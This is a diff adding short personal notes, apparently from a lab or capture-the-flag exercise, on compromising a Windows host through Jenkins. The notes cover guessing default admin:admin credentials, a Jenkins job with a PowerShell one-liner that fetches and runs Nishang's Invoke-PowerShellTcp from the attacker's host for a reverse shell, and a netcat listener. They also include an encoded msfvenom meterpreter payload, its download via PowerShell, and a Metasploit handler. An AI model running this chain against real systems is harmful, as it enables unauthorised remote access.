@@ -1,0 +1,33 @@
+
+Notes:
+Downloaded https://github.com/samratashok/nishang
+
+Started with Nmap scan
+Found Jenkins on 8080 and password was admin:admin #guess
+
+
+In a job added:
+ powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
+
+Before running job started python server to transfer from:
+ python3 -m http.server
+And started ncat listener
+ nc -lvnp <port>
+
+Once I had access with basic tcp reverse shell I set up meterpreter
+Created shell exe in msfvenom
+ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
+
+Once made sent over python server and powershell:
+ powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
+
+Before running needed to set up handler in metasploit:
+ use exploit/multi/handler
+ set PAYLOAD windows/meterpreter/reverse_tcp
+ set LHOST your-ip
+ set LPORT listening-port run
+
+Ran reverse shell with:
+ Start-Process "shell-name.exe"
+
+Used whoami /priv to determine privileges on orig. shell
